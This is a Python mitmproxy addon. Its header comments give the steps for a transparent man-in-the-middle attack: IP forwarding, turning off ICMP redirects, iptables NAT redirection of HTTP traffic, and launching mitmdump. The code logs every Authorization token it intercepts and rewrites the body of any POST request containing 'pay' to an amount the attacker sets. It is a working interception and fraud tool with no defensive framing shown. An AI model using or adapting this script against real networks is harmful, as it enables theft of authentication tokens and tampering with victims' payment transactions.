#
# 1. Enable IP Forwarding
#   sysctl -w net.ipv4.ip_forward=1
#   [OPTIONAL] sysctl -w net.ipv6.conf.all.forwarding=1
#
# 2. Disable ICMP redirects.
#   sysctl -w net.ipv4.conf.all.send_redirects=0
#
# 3. Create an iptables ruleset that redirects the desired traffic to mitmproxy
#  iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
#  [OPTIONAL] ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
#
# 4. Fire up mitmproxy
#  mitmdump --mode transparent --script /root/Desktop/http_mitm.py --set pay=[amount]
#

import re
import urllib.parse
import typing
import json

from mitmproxy import http, ctx

def load(loader):
    loader.add_option(
        name = "pay",
        typespec = typing.Optional[int],
        default = None,
        help = "Add a pay amount",
    )

def configure(updates):
    if "pay" in updates and ctx.options.pay is None:
        print("Please insert a pay amount!")
        ctx.master.shutdown()

def request(flow: http.HTTPFlow) -> None:
    # Search for Authorization token
    if 'Authorization' in flow.request.headers:
        authorization = flow.request.headers.get('Authorization')
        ctx.log.info(f'[AUTHORIZATION TOKEN FOUND]: {authorization}')

    # Modify POST request pay payload
    if flow.request.method == 'POST' and 'pay' in flow.request.content.decode():
        inject = json.dumps({ "pay": ctx.options.pay })
        ctx.log.info(f'[PAY PAYLOAD MODIFIED]: from {flow.request.content.decode()} to {inject}')
        flow.request.content = inject.encode()